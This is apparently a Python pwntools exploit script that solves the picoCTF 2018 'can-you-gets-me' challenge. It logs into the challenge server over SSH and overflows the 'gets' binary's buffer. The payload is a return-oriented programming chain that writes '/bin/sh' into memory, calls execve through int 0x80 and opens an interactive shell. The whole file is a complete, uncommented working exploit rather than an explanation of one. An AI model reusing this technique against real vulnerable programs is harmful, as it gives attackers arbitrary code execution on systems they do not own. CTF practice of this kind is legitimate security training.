
#!/usr/bin/python
import struct
from pwn import *
debug = 0
user = 'XXXX'
pw = 'XXXX'
if not debug:
    s = ssh(host = '2018shell4.picoctf.com', user = user, password = pw)
    s.set_working_directory('/problems/can-you-gets-me_4_f269dbca3097204b5d4a0064467b0a8c')
   
    r = s.process('./gets')
else:
    r = process('./gets')

payload = ""
payload += "A"*28
payload += p32(0x080b84d6) # pop eax
payload += p32(0x6e69622f) # /bin
payload += p32(0x0806f19a) # pop edx
payload += p32(0x80e9c70) #somewhere in bss
payload += p32(0x08054b4b) # mov dword ptr [edx], eax; ret
payload += p32(0x080b84d6) # pop eax
payload += p32(0x68732f) # /sh
payload += p32(0x0806f19a) # pop edx
payload += p32(0x80e9c70 + 4) #somewhere in bss
payload += p32(0x08054b4b) # mov dword ptr [edx], eax; ret
payload += p32(0x08049473) # xor eax, eax
payload += p32(0x0806f19a) # pop edx
payload += p32(0x80e9c70 + 7)
payload += p32(0x08054b4b) # mov dword ptr [edx], eax; ret


payload += p32(0x0806f19a) # pop edx
payload += p32(0x0)
payload += p32(0x080dece1) # pop ecx
payload += p32(0x0)
payload += p32(0x080481c9) # pop ebx
payload += p32(0x080e9c70) # address of /bin/sh
payload += p32(0x080b84d6) # pop eax
payload += p32(0x0b) #execve syscall number
payload += p32(0x0806f79f) #int 0x80
payload += p32(0x080481b2)


#print payload 
print r.recvuntil('GIVE ME YOUR NAME!\n')
r.send(payload + '\n')
r.interactive()
